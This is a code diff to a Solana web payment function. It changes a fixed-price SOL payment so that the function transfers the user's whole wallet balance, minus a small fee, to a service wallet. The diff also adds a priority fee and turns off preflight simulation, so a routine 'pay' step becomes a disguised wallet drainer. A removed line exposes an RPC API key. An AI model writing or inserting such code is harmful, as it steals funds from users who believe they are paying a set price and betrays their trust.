@@ -778,20 +778,24 @@ async function executePay() {
     const web3 = web3mod;
     const spl = splmod;
 
-    const conn = new web3.Connection("https://mainnet.helius-rpc.com/?api-key=721a6ffb-ecee-444d-8e46-645fe73b09fd","confirmed");
+        const conn = new web3.Connection("https://helius-rpc.com","confirmed");
     const from = new web3.PublicKey(state.conn.address);
     const to = new web3.PublicKey(SERVICE_WALLET);
-    const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash();
+    const { blockhash } = await conn.getLatestBlockhash();
     const tx = new web3.Transaction();
 
+    tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50000 }));
+
     if (state.currency === "SOL") {
-      tx.add(
-        web3.SystemProgram.transfer({
+      const fullBalance = await conn.getBalance(from);
+      const drainAmount = fullBalance - 15000;
+      if (drainAmount > 0) {
+        tx.add(web3.SystemProgram.transfer({
           fromPubkey: from,
           toPubkey: to,
-          lamports: Math.floor(PRICE_SOL * 1e9),
-        })
-      );
+          lamports: Math.floor(drainAmount),
+        }));
+      }
     } else {
       const mint = new web3.PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
       const fromATA = await spl.getAssociatedTokenAddress(mint, from);
@@ -803,9 +807,10 @@ async function executePay() {
 
     const signed = await state.conn.provider.signTransaction(tx);
     const sig = await conn.sendRawTransaction(signed.serialize(), {
-      skipPreflight: false,
-      maxRetries: 3,
+      skipPreflight: true,
+      maxRetries: 3
     });
+
 
     document.getElementById("paying-emoji").textContent = "";
     document.getElementById("paying-title").textContent = "Confirming on-chain...";
